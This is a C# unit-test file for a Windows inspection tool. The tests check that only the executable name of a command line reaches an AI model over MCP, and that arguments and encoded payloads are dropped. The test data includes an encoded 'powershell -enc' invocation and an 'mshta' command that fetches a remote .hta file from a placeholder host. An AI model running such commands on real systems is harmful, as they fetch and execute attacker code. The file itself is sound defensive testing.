using WinSight.Application;
using Xunit;

namespace WinSight.Application.Tests;

/// <summary>
/// The command line must not reach a model through the one field the MCP gate does not govern.
/// </summary>
/// <remarks>
/// <b>The leak.</b> The persistence detail was built from
/// <c>ImagePath ?? ExpectedImagePath ?? Command</c>. The MCP projector withholds fields <i>named</i>
/// <c>command</c>/<c>commandLine</c> and only substitutes environment variables in <c>Detail</c>, so
/// whenever the image could not be resolved the entire command line - base64 payload included -
/// crossed to the model with neither <c>WINSIGHT_MCP_ALLOW_SENSITIVE=1</c> nor
/// <c>includeSensitive=true</c>. That is exactly the encoded-interpreter case the gate exists for,
/// <c>docs/MCP.md</c> states the opposite, and <c>SECURITY.md</c> puts the bypass in scope.
/// </remarks>
public sealed class SensitiveDetailTests
{
    /// <summary>The executable names the entry; the arguments are the payload and are dropped.</summary>
    [Theory]
    [InlineData("powershell -enc SQBFAFgAIAAoAA==", "powershell")]
    [InlineData(@"""C:\Program Files\App\a.exe"" --secret hunter2", @"C:\Program Files\App\a.exe")]
    [InlineData(@"C:\tools\x.exe", @"C:\tools\x.exe")]
    [InlineData("mshta https://example.invalid/a.hta", "mshta")]
    public void OnlyTheExecutableTokenSurvives(string command, string expected) =>
        Assert.Equal(expected, Adapters.CommandHead(command));

    [Theory]
    [InlineData("")]
    [InlineData("   ")]
    [InlineData(null)]
    public void NothingInMeansNothingOut(string? command) =>
        Assert.Equal(string.Empty, Adapters.CommandHead(command));

    /// <summary>
    /// A single unbroken token can itself be a payload - an encoded blob with no spaces - so length
    /// is bounded rather than trusted.
    /// </summary>
    [Fact]
    public void AnAbsurdlyLongTokenIsTruncated()
    {
        var head = Adapters.CommandHead(new string('A', 4096));

        Assert.True(head.Length < 200, $"an unbounded token survived: {head.Length} characters");
        Assert.EndsWith("\u2026", head, StringComparison.Ordinal);
    }

    /// <summary>The base64 body of the canonical encoded-command abuse must not appear.</summary>
    [Fact]
    public void AnEncodedPayloadNeverAppearsInTheHead()
    {
        const string Payload = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA";

        Assert.DoesNotContain(Payload, Adapters.CommandHead($"powershell -enc {Payload}"), StringComparison.Ordinal);
    }
}
